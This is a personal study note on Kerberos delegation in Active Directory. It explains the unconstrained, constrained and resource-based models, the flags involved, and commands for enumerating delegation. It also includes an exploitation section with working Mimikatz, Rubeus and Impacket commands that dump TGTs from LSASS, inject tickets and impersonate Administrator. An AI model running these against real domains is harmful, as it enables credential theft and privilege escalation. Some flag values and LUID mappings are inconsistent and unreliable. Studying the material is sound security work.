---
created: 2025-10-31
modified: 2025-10-31
---

## Introduction to Kerberos

**`Kerberos`** is a network authentication protocol widely used in environments like `Active Directory (AD)` to securely authenticate users and services. It operates on a ticket-based system: users obtain a `Ticket-Granting Ticket (TGT`) from the `Key Distribution Center` (`KDC`, typically the domain controller) after initial authentication. This `TGT` is then used to request `Ticket-Granting Service (TGS)` tickets for specific services, enabling access without repeatedly sending credentials over the network.

`Kerberos` ensures mutual authentication, confidentiality, and integrity, but its complexity can lead to misconfigurations that attackers exploit for lateral movement or privilege escalation.

## Kerberos Delegation

Delegation in `Kerberos` allows a service (e.g., a web server) to `impersonate` an authenticated user when accessing another service (e.g., a database) on that user's behalf. This is essential for multi-tier applications where the front-end needs to fetch data from back-end resources without requiring the user to authenticate multiple times or granting excessive permissions to the service account itself.

For example, a user logs into a web app, which then queries a SQL database as if it were the user, ensuring the database applies the user's specific access controls. Delegation relies on the service forwarding or requesting tickets that represent the user.

However, if misconfigured, delegation can be abused, allowing attackers to impersonate users across services and potentially compromise the entire domain.


## Types of kerberos delegation

### 1. Kerberos Unconstrained Delegation (`KUD`)

**Unconstrained Kerberos Delegation (`KUD`)**, introduced with Windows Server 2000, allows a **service or computer account** to impersonate an authenticated user to **any** service in the domain. It’s intended for multi-tier scenarios (for example, a front-end web server accessing a back-end service on behalf of a user) but is dangerous because it grants broad, unrestricted impersonation. When a user authenticates to a `KUD-enabled` service, that service obtains the user’s Kerberos authentication context (effectively a forwarded `TGT` cached in the service’s process/`LSASS`), which the service can use to request service tickets `(TGS)` for arbitrary `SPNs` and act as the user. Domain controllers must be able to impersonate users for` AD/KDC` functionality (so they functionally have this capability), but enabling `KUD` on `non-DC` hosts greatly increases the risk of unauthorized impersonation and lateral compromise (similar effects to Pass-the-Ticket attacks when tickets or `LSASS` memory are exfiltrated).

> [!info]
> In Unconstrained Kerberos Delegation (KUD) only **accounts that accept inbound authentications** — typically **computer accounts** (machine objects) and **service accounts** (accounts under which services run) — can actually perform delegation when their `TRUSTED_FOR_DELEGATION` bit is set. A normal interactive **user account** having the `TRUSTED_FOR_DELEGATION` flag is usually pointless: ordinary users don’t accept other users’ Kerberos authentications, so there’s nothing for them to forward or impersonate. The practical difference is that computer and service accounts either run network-facing services or are represented by SPNs (servicePrincipalName entries), so when a client authenticates to those endpoints the host/service can obtain the user’s Kerberos context and delegate it. Only when a user account is _also_ used as a service principal (e.g., it has SPNs or is the identity of a running service) does the flag become meaningful.
> 
> **How to tell them apart (quick checks):**
> 
> - **Computer account:** `objectCategory=computer` / `objectClass=computer`; `sAMAccountName` typically ends with `$`.   
>     `Get-ADComputer -Identity ServerA$`
>     
> - **Service account (user object used as service principal):** a **user** object with `servicePrincipalName` populated or `msDS-ManagedServiceAccount`/gMSA attributes. 
>
>     `Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName`
> 
> - **Normal user account:** `objectCategory=person` / `objectClass=user`, no SPNs, `sAMAccountName` does **not** end with `$`.
>     `Get-ADUser -Identity alice`
> 
> Finding user objects being used as services 
> 
> `Get-ADUser -Filter * -Properties servicePrincipalName | Where-Object { $_.servicePrincipalName } | Select-Object SamAccountName, servicePrincipalName`


When a user authenticates to the domain they receive a Ticket-Granting Ticket (TGT) from the KDC; when that user then requests access to a service (for example `HTTP/service-evil`) the client uses its TGT to obtain a service ticket (TGS) for that service from KDC and presents the TGS to the service as proof of identity. If the service’s account is marked `TRUSTED_FOR_DELEGATION` (unconstrained delegation), the Windows security subsystem associates that authenticated session with the user’s full Kerberos authentication context and makes the user’s forwardable credentials (effectively the TGT or an equivalent forwardable auth context) available to the host so the host can act on the user’s behalf. The service does not need the user’s password; instead it asks the OS/Kerberos stack (LSASS and the SSPI APIs) to use the stored user context to request new service tickets (TGS) for arbitrary downstream SPNs, and then presents those tickets to other services to authenticate as the user. Because the sensitive material enabling this behavior resides in LSASS/session caches on the KUD host, compromise of that host or access to its process memory lets an attacker either invoke impersonation APIs to request tickets on behalf of victims or extract ticket material for reuse, which is why KUD hosts create a broad impersonation pivot.
#### Attributes and Flags Involved in Unconstrained Kerberos Delegation

#### TrustedForDelegation

The **`TrustedForDelegation`** attribute is a critical flag within the` userAccountControl` attribute of an AD user or computer object, represented by the `bitmask` value `0x80000` (decimal 524288). When set to **True,** it enables `unconstrained delegation`, allowing the account to impersonate authenticated users to any service in the domain.


#### servicePrincipalName (SPN)

The `servicePrincipalName (SPN)` attribute defines the services an AD account (user or computer) can represent in Kerberos authentication. It’s a multi-valued attribute containing strings like `HTTP/web.example.com` or `MSSQLSvc/db.example.com`, which specify the service type, hostname, and optionally a port. **SPNs** are essential for Kerberos because they identify the target service when a client requests a `service ticket (TGS)` from the` Key Distribution Center (KDC)`. In `KUD`, the` SPN` on the delegating service’s account (e.g., HTTP/web.example.com for a web server) is used when the user authenticates, ensuring the `KDC` issues a `TGS` that includes the user’s `TGT` for delegation. Without a valid SPN, the account cannot participate in Kerberos authentication, making this attribute foundational for delegation. Attackers may manipulate `SPNs` (e.g., adding rogue SPNs with tools like `addspn.py`) to coerce authentications to malicious services, amplifying `KUD’s` risks.


#### msDS-AllowedToDelegateTo

**`msDS-AllowedToDelegateTo`** is the Active Directory attribute used for **constrained delegation (KCD)**. It is a **multi-valued** attribute placed on the _account that will perform delegation_ (typically a computer or service account) and contains the list of **SPNs** (for example, `CIFS/fileserver.example.com`) that the account is allowed to delegate to. In **Unconstrained Kerberos Delegation (KUD)** this attribute is **not used** (empty or absent), and the presence of the `TRUSTED_FOR_DELEGATION` flag on the account with no `msDS-AllowedToDelegateTo` entries is what results in unrestricted delegation behavior i.e., the service can request TGS tickets for _any_ SPN in the domain.Enumeration tools (e.g., Impacket’s `findDelegation.py` or `PowerView/BloodHound`) detect and highlight accounts that have `TRUSTED_FOR_DELEGATION` set but no `msDS-AllowedToDelegateTo` entries — a quick way to distinguish KUD from properly-scoped constrained delegation.

#### NOT_DELEGATED

The **“Account is sensitive and cannot be delegated”** setting, represented by the **`NOT_DELEGATED`** flag in the `userAccountControl` attribute (`0x1000000`, decimal `1048576`), prevents an account’s credentials from being used in any **Kerberos delegation** scenario — including **Unconstrained (KUD)**, **Constrained (KCD)**, and **Resource-Based Constrained Delegation (RBCD)**.

When this flag is set, the **KDC** (Key Distribution Center) will **not issue a forwardable TGT** for the account. As a result, even if the user authenticates to a service configured for delegation, the service will not receive a TGT that can be forwarded, effectively **blocking impersonation and delegated access**. This is commonly seen in accounts with membership to the `Protected Users` group, [[Groups#Protected users Group]]

#### Kerberos Ticket Flags

##### **Forwardable** 
The Forwardable flag, set on a TGT or TGS, indicates that the ticket can be forwarded to another service for delegation. In KUD, when a user authenticates to the KDC, their TGT is marked as `forwardable` (typically enabled by default in Kerberos policies). When the user requests a TGS for a KUD-enabled service (e.g., HTTP/web.example.com), the KDC includes a copy of the `forwardable` TGT in the TGS. This allows the service to store and use the TGT to request additional TGS tickets for other services. The flag is critical for KUD’s operation, as it enables the delegation chain. Without it, the ticket cannot be passed along, halting delegation. Tools like `Wireshark (kerberos.flags.forwardable) or Mimikatz (kerberos::list)` can inspect this flag in captured tickets.

##### **Forwarded** 
The Forwarded flag marks a `TGT` copy stored on the KUD-enabled service, indicating it was delegated from the user. When the user’s TGS (containing the TGT copy) is sent to the service via `AP-REQ`, the service extracts and stores this TGT in memory (e.g., `LSASS`). The Forwarded flag distinguishes this TGT as a delegated ticket, ensuring the KDC recognizes it as valid for further TGS requests. This flag is crucial for traceability, as it shows the ticket’s origin in the delegation process. Attackers target these stored `TGTs` using tools like `Mimikatz (sekurlsa::tickets /export)` or` Rubeus (dump /service:krbtgt)`, as they enable impersonation across the domain.

##### **OK-AS-DELEGATE** 
The **OK-AS-DELEGATE** flag is included in the TGS issued by the KDC for a KUD-enabled service. It signals to the client (user’s device) that the service is trusted for delegation, confirming that the KDC has verified the TrustedForDelegation attribute on the service’s account. This flag ensures the client understands that its TGT will be forwarded to the service, maintaining transparency in the Kerberos protocol. It’s visible in the TGS-REP packet (checkable via Wireshark or klist with detailed output). In KUD, this flag is always present, as the service’s unrestricted delegation capability is explicitly allowed by the KDC. Misconfigurations leading to unintended KUD settings can be spotted by auditing for this flag in Kerberos traffic.


#### Enumerating Unconstrained Kerberos Delegation Opportunities

**Unconstrained Kerberos Delegation (KUD**) is identified by querying Active Directory for user or computer objects where the **TrustedForDelegation** flag (`bitmask 0x80000 in userAccountContro`l) is set to **True**. This typically excludes domain controllers `primaryGroupID 516`, as they have KUD enabled by default.

##### PowerShell Commands

PowerShell with the AD module (import via `Import-Module ActiveDirectory`) is the primary method for Windows-based enumeration.

Basic enumeration for computers excluding DCs:

```powershell
Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -and (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation, servicePrincipalName | Select-Object Name, DNSHostName, TrustedForDelegation
```

Detailed enumeration for computers:

```powershell
Get-ADComputer -Filter * -Properties TrustedForDelegation, servicePrincipalName | Where-Object {$_.TrustedForDelegation -eq $True -and $_.PrimaryGroupID -ne 516} | Select-Object Name, DNSHostName, servicePrincipalName, TrustedForDelegation
```

Basic enumeration for users. Lists all user accounts with KUD enabled 

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation, servicePrincipalName | Select-Object Name, SamAccountName, TrustedForDelegation
```

As we know, user accounts with KUD enabled but have no SPN (are not service accounts) are useless in this case, so we filter user accounts with SPNs using the command below:

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $True -and servicePrincipalName -like "*"} ` -Properties TrustedForDelegation, servicePrincipalName | Select-Object Name, SamAccountName, servicePrincipalName
```


**LDAP** Filter-Based Query for Users and Computers, 524288 is decimal for 0x80000

```powershell
Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties TrustedForDelegation | Select-Object Name, ObjectClass, DistinguishedName
```

[**PowerView Module**](https://powersploit.readthedocs.io/en/latest/Recon/)

- For computers

```powershell
Get-DomainComputer -Unconstrained -Properties name, dnshostname, serviceprincipalname | Select-Object name, dnshostname
```

- For users

```powershell
Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties name, samaccountname
```

[adPEAS](https://github.com/61106960/adPEAS)

```powershell
.\adPEAS.ps1 -Enum Delegation
```


##### Unix/Linux Commands

Impacket's findDelegation.py

```bash
python3 findDelegation.py -dc-ip <DC_IP> example.com/username:password
```

BloodyAD

```bash
bloodyAD -d example.com -u username -p password --host <DC_IP> get object --filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```


CrackMapExec 

```bash
crackmapexec ldap <DC_IP> -u username -p password --kdcHost <DC_IP> --delegation
```

ldapsearch 

```bash
ldapsearch -H ldap://dc.example.com -x -D "CN=user,OU=Users,DC=example,DC=com" -W -b "DC=example,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" name objectClass distinguishedName
```

#### Exploitation 

Unconstrained Kerberos Delegation (KUD) allows a service to impersonate a user to any other service in the domain by storing the user's Ticket-Granting Ticket (TGT) in memory. This makes KUD a prime target for exploitation, as compromising a KUD-enabled service grants attackers the ability to extract TGTs and perform Pass-the-Ticket (PTT) attacks,

> [!NOTE]
> To extract Tickets from `memory/LSASS` we need `local admin privilege` or `seDebugPrivilege`

The goal is to extract TGTs from a compromised KUD-enabled service and use them to impersonate users, including privileged ones like domain admins, for lateral movement or escalation. Common techniques involve **coercing authentication** to capture TGTs or directly **dumping** them from memory. Tools like **Mimikatz, Rubeus, Impacket**, and **krbrelayx** are used, leveraging vulnerabilities like **PrinterBug** or **PetitPotam** for coercion. The steps include:

##### Scenario 1

Our target user has already authenticated to the service/computer account that has `TRUSTED_FOR_DELEGATION` set to `TRUE`. This means that the service/computer account has access to the target's  Kerberos authentication context and makes the user’s forwardable credentials,effectively the TGT or an equivalent forwardable auth context, available to the service/computer account to enable delegation.

In this case we can impersonate a user in several ways:

###### 1. **use impacket's getST.py**

With this we can request a TGS for accessing a service that we don't have access to by impersonating a user (target account) that has access to that service. if possible we can crack the TGS using hashcat to retrieve clear text password for that user.

**Key Prerequisites** 

- **Compromised KUD Account**: You must control a user or computer account that has **Unconstrained Delegation** permissions enabled in Active Directory

- **Captured TGT**: The KUD-enabled service must have captured the Ticket-Granting Ticket (TGT) of a privileged user (like a Domain Admin) who has authenticated to it. The `getST.py` exploitation process often relies on the fact that a KUD service can use a captured TGT to perform the S4U2Proxy exchange

- **Target User Protections**: Be aware that if the user you are trying to impersonate (e.g., `Administrator`) has the **"Account is sensitive and cannot be delegated (NOT_DELEGATED)"** flag set , this attack will fail. Users in the "Protected Users" group are also generally safe from this, though there can be exceptions

Case: We don't have access to mysql service but the administrator has access to the service. We can get administrator's TGS for accessing the service using:

```bash
python3 getST.py -spn 'MSSQLSvc/sqlserver.domain.local:1433' -impersonate Administrator -dc-ip <IP_of_Domain_Controller> 'DOMAIN/KUD-enabled-Account:Password'
```


###### 2. Extract the Captured tickets (TGT)

Must login using service/computer account since this is the account having access the the target's TGT.

- Using Mimikatz

```powershell
mimikatz.exe "sekurlsa::tickets /export" exit
```

- using Rubeus

To list all tickets

```powershell
Rubeus.exe triage
```

To dump all tickets

```powershell
Rubeus.exe dump
```

To filter based on service that issued the ticket we can include `/service:<service-name>` flag. In this case we are interested in TGTs so we can specify the service to be `krbtgt` since it is the service responsible for issuing TGTs

```powershell
Rubeus.exe dump /service:krbtgt /nowrap
```

This will print base64 encoded ticket to the terminal.

You can then perform PTT by injecting the ticket into the current session using 

```powershell
Rubeus.exe ptt /ticket:<BASE64_STRING>
```

Or you can convert the ticket to .ccache format 

First you copy the base64 encoded ticket and decode it and save it to .kirbi file eg `administrator.kirbi`

The you convert it .ccache using `impacket-ticketConverter` eg

```bash
impacket-ticketConverter administrator.kirbi administrator.ccache
```

A cleaner way of extracting the tickets is using  **Logon Session ID (LUID)**
The LUID identifies which user session to extract tickets from:
- **Common LUID values:**
    - `0x3e4` = SYSTEM
    - `0x3e7` = Current user session
    - `0x12c34` = Other user sessions (varies)

the command below lists all LUID and associated tickets 

```powershell
Rubeus.exe triage
```

Then to dump a specify ticket and save it to a file 

```powershell
Rubeus.exe dump /service:krbtgt /luid:0x3e7 /ticketfile:admin_tgt.kirbi
```



##### Scenario 2

No captured TGT.  In this case the service/computer is enabled for KUD but no user has authenticated to the service or atleast our target user has not authenticated to the service. In this case we have to force the user to authenticate to the service/computer in order to capture /his/her TGT that will be used for delegation. 

In this i wont write much because they are detailed notes on this: 

[hacktricks KUD](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html)
[read team notes KUD](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
[The hacker Recipes KUD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)



### **2. Kerberos Constrained Delegation (KCD)**

**Kerberos Constrained Delegation (KCD)** lets a service account (or computer) **delegate** a user’s credentials **only to a specific list of target services (SPNs)**  i.e., the delegating account can request service tickets on behalf of a user, but only for SPNs enumerated in `msDS-AllowedToDelegateTo`. KCD is a safer, scoped alternative to Unconstrained Delegation (KUD).

KCD can  be configured with or without protocol transition.

#### **Protocol Transition (S4U2Self)**

**Protocol Transition** is a Kerberos extension that allows a service to obtain a Kerberos ticket **on behalf of a user who did not originally authenticate using Kerberos**.

In simpler terms, it lets a service **“transition”** a user’s authentication from another protocol (like NTLM, Basic Auth, Forms, or OAuth) into **Kerberos**.  This concept was introduced in **Windows Server 2003** as part of the **Service-for-User (S4U)** extensions.

##### **Why Protocol Transition Exists**

Before this extension, if a **front-end web service** wanted to access a **back-end service** (for example, SQL or file server) as the logged-in user, it needed the user’s Kerberos ticket.  
However, if the user logged in using **NTLM** or any **non-Kerberos** method, the front-end didn’t have a TGT (Ticket Granting Ticket) and therefore couldn’t get a Kerberos service ticket for the backend.

Protocol Transition solves this limitation. It allows the front-end to request a Kerberos ticket **on behalf of the user**, even though the user didn’t authenticate with Kerberos in the first place.

##### **How Protocol Transition Works**

When Protocol Transition is enabled, it uses two key Kerberos extensions:

######  **1. S4U2Self (Service for User to Self)**

In this step, the **front-end service** (whose account has the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag set) requests a Kerberos service ticket **as if it were the user**.

Essentially, the service tells the KDC:

> “Give me a ticket for myself, but make it as if I am Alice.”

The KDC verifies that the service is **trusted for protocol transition**, then issues a **forwardable TGS ticket** (known as a “user-to-self” ticket).

**Result:** The service now has a Kerberos token that represents Alice, even though Alice never logged in with Kerberos.

###### **2. S4U2Proxy (Service for User to Proxy)**

After completing S4U2Self, the front-end service can request another service ticket, this time to access a **backend service** (e.g., SQL, CIFS, LDAP) **on behalf of Alice**.

This is the **actual delegation** step.

However, this delegation only succeeds if the backend service’s SPN is listed in the **`msDS-AllowedToDelegateTo`** attribute of the front-end service’s account.

The KDC then issues a ticket for **Alice → backend-service**, allowing the front-end to connect and act as Alice securely.


---

Ad discussed earlier in KCD the `msDS-AllowedToDelegateTo` is propagated with a list of SPNs (services) that delegating account can request service tickets on behalf of a use. 

KCD can  be configured with or without protocol transition:

- Without Protocol Transition: In this case there is no other flag that is needed 
- With Protocol Transition: Enabled by the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` bit `0x1000000` in the` UserAccountControl` attribute of the delegating account.

In both cases exploitation approach is different.

I won't write on enumeration, same methodology as that from KUD just a few tweaks on the commands.

[Hacktricks KCD](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html)
[Red Team Notes KCD](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
[The Hacker Recipes KCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)


### **3. Resource Based Constrained Delegation (RBCD)**

**RBCD** allows a **back-end service** (the resource, e.g., fileserver.company.local) to define which **front-end services** (e.g., server.company.local) can impersonate users to access it. This reverses the traditional KCD model, where the front-end service specifies allowed back-end services. RBCD uses the Kerberos S4U2Proxy extension, similar to KCD, but is configured on the resource’s AD object, making it more granular and easier to manage in complex environments.
##### **Key Features:**

**Control on Resource:** The back-end service’s AD object specifies trusted delegators via the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute.

**No Protocol Transition by Default:** RBCD typically requires Kerberos authentication unless combined with the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag for protocol transition. This conflicts previous notes on KCD where the flag `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` was needed in the delegating account's UAC in order to enable it to perform **S4U2Self**. However this is not entirely true as noted in hacktricks:

> [!info]
> The reality is that even without that value "**have `TrustedToAuthForDelegation`**", you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
> 
> However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work**.

**No TGT Exposure:** Like KCD, RBCD doesn’t include the user’s TGT in service tickets, unlike unconstrained delegation, reducing the risk of attacks like your lab’s TGT capture.


For detailed explanations and exploitation:

[Hacktricks RBCD](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)
[Red Team Notes RBCD](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
[The Hacker Recipes RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
[hacking articles RBCD](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)

I think that is it. 


> [!summary]
> **Kerberos delegation** is the mechanism that lets a service act on behalf of a user when accessing other services. In Active Directory environments this is necessary for multi-tier apps (for example, a web front end calling a database as the user), but it’s also a high-risk capability because it grants impersonation power across services. Delegation is implemented through Kerberos tickets and specific AD attributes/flags that control who may delegate and to whom.
> 
> **Unconstrained delegation (KUD)** is the oldest and most dangerous form. When an account is marked `TrustedForDelegation` (UAC bit `0x80000`), the KDC will include a `forwardable` copy of the user’s `TGT` in the service ticket issued to that account. The service therefore receives the user’s Kerberos context (a delegated TGT) in memory and can request tickets to any SPN in the domain. Because the actual TGT is effectively forwarded into the service process (LSASS), compromising a KUD-enabled host gives an attacker wide impersonation capability and makes TGT extraction a powerful post-compromise primitive.
> 
> **Constrained delegation (KCD)** scopes delegation to a set of allowed back-end services. This is expressed on the delegating account via the `msDS-AllowedToDelegateTo` attribute, which lists target SPNs. KCD can operate in two modes: **without protocol transition** (where the user must have authenticated with Kerberos and forwardable tickets are used), and **with protocol transition**, which uses the `S4U` extensions. In protocol transition, the delegating service that has the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` UAC flag (`0x1000000`) can perform `S4U2Self` to obtain a Kerberos ticket for a user who authenticated with a non-Kerberos protocol (NTLM, Basic, forms, etc.), and then perform `S4U2Proxy` to request a ticket to an allowed backend SPN. 
> 
> **Resource-Based Constrained Delegation (RBCD)** inverts the trust model: the **target** resource controls who may delegate to it. The target’s AD object stores a security descriptor (visible via `msDS-AllowedToActOnBehalfOfOtherIdentity`) that names accounts allowed to act on behalf of users for that resource. RBCD was designed to enable cross-domain, delegated scenarios and to decentralize delegation control so resource owners can grant specific front-end services the right to impersonate users to them. Like KCD, RBCD uses `S4U2Self` and `S4U2Proxy`. No user TGT is forwarded into the service — the KDC issues appropriate tickets when the ACL on the target permits it.
> 
> **Protocol transition** is the `S4U2Self` mechanism that lets a service obtain a Kerberos ticket for a user who did not authenticate via Kerberos. It exists to solve the practical problem of front ends that authenticate users via NTLM or web forms but still need to call Kerberos-based back ends as that user. `S4U2Self` (get a ticket for the user) combined with `S4U2Proxy` (request a downstream service ticket on their behalf) is how KCD with protocol transition and RBCD accomplish delegation without a forwarded TGT. The `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag controls whether the `S4U2Self` ticket the KDC returns is forwardable; lacking that flag can make chained `S4U2Proxy` requests non-forwardable and limit classic KCD, though RBCD may still operate depending on the target’s configuration.
> 
> There are also protections and negative flags to be aware of: `NOT_DELEGATED` (a flag marking accounts that must not be delegated) and group membership like`Protected Users` that prevent forwardable TGT issuance for high-value accounts. These defensive knobs are important because they stop TGT forwarding and reduce the surface for delegation abuse.

